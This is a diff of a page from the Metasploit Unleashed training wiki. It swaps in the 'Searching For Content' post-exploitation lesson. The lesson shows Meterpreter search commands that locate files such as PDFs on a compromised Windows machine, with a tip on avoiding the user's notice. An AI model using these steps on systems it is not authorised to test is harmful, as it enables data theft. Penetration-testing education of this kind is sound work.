@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Searching For Content - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Searching_For_Content" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Searching_For_Content&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Searching_For_Content&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Searching_For_Content&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,204 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Searching For Content</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Searching_For_Content#column-one">navigation</a>, <a href="Searching_For_Content#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Information leakage is one of the largest threats that corporations face and much of it can be prevented by educating users to properly secure their data.  Users being users though, will frequently save data to their local workstations instead of on the corporate servers where there is greater control.
+<br />
+<br />
+Meterpreter has a search function that will, by default, scour all drives of the compromised computer looking for files of your choosing.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>search -h</span>
+Usage: search [-d dir] [-r recurse] -f pattern
+Search for files.
+
+OPTIONS:
+
+    -d <opt>  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )
+    -f <opt>  The file pattern glob to search for. (e.g. *secret*.doc?)
+    -h        Help Banner.
+    -r <opt>  Recursivly search sub directories. (Default: true)</pre>
+<br />
+To run a search for all jpeg files on the computer, simply run the search command with the '-f' switch and tell it what filetype to look for.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>search -f *.jpg</span>
+Found 418 results...
+<span style='color:#00ff00;'>...snip...</span>
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg (28521 bytes)
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg (71189 bytes)
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg (83794 bytes)
+    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg (105542 bytes)
+<span style='color:#00ff00;'>...snip...</span></pre>
+<br />
+Searching an entire computer can take a great deal of time and there is a chance that an observant user might notice their hard drive thrashing constantly.  We can reduce the search time by pointing it at a starting directory and letting it run.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf</span>
+Found 2 results...
+    c:\documents and settings\administrator\desktop\operations_plan.pdf (244066 bytes)
+    c:\documents and settings\administrator\desktop\budget.pdf (244066 bytes)
+<u>meterpreter</u> ></pre>
+<br />
+By running the search this way, you will notice a huge speed increase in the time it takes to complete.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="MSF_Post_Exploitation" title="MSF Post Exploitation">MSF Post Exploitation</a> &gt; Searching For Content</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Privilege_Escalation" title="Privilege Escalation">Privilege Escalation</a> &#124; <a href="PSExec_Pass_The_Hash" title="PSExec Pass The Hash">PSExec Pass The Hash</a> &#124; <a href="Event_Log_Management" title="Event Log Management">Event Log Management</a> &#124; <a href="Fun_With_Incognito" title="Fun With Incognito">Fun With Incognito</a> &#124; <a href="Interacting_With_The_Registry" title="Interacting With The Registry">Interacting With The Registry</a> &#124; <a href="Enabling_Remote_Desktop" title="Enabling Remote Desktop">Enabling Remote Desktop</a> &#124; <a href="Packet_Sniffing" title="Packet Sniffing">Packet Sniffing</a> &#124; <a href="Pivoting" title="Pivoting">Pivoting</a> &#124; <a href="TimeStomp" title="TimeStomp">TimeStomp</a> &#124; <a href="Screen_Capture" title="Screen Capture">Screen Capture</a> &#124; <strong class="selflink">Searching For Content</strong> &#124; <a href="John_The_Ripper" title="John The Ripper">John The Ripper</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 507/1000000
+Preprocessor generated node count: 2651/1000000
+Post‐expand include size: 4698/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:69-0!*!0!*!*!*!* and timestamp 20131123195625 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Searching_For_Content&amp;oldid=83">http://www.offensive-security.com/w/index.php?title=Searching_For_Content&amp;oldid=83</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:MSF_Post_Exploitation&amp;action=edit&amp;redlink=1" class="new" title="Category:MSF Post Exploitation (page does not exist)">MSF Post Exploitation</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +689,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.142 secs. --></body></html>
